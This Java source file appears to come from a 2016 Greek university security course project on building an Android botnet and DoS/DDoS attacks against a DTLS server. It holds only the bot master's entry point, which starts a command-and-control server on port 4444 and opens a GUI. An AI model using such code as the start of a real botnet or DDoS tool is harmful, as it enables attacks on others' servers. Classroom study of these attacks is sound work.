/**
 *                     Πανεπιστήμιο Αιγαίου
 *      Τμήμα Μηχανικών Πληροφοριακών & Επικοινωνιακών Συστημάτων
 * 
 *          Ασφάλεια Ασύρματων & Κινητών Δικτύων Επικοινωνιών
 *                     Εαρινό Εξάμηνο 2016
 *                      Project Μαθήματος
 * 
 * Δημιουργία secure botnet με android clients & Dos/DDoS σε DTLS Server.
 * 
 *          Πέππας Κωνσταντίνος 321/2011134 - icsd11134@icsd.aegean.gr
 *          Σωτηρέλης Χρήστος   321/2012182 - icsd12182@icsd.aegean.gr
 *          Χαϊκάλης Νικόλαος   321/2012200 - icsd12200@icsd.aegean.gr
 * 
 *          Καθηγητής Μαθήματος: Γ. Καμπουράκης 
 * 
 */

import java.io.Serializable;

public class BotMaster_Android implements Serializable{

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {  
        BotMasterCnC_Chat master = new BotMasterCnC_Chat(4444);
        boolean start = master.Start_Connection();//ksekinaw tn Botmaster (Server tu CnC) k pairnw peisw true otan ginei to connection
        //an ginei to connection anoigw to GUI tu botmaster.
        if(start == true){
            GUI gui = new GUI(master);
            gui.createGUI();
        }
    }
    
}
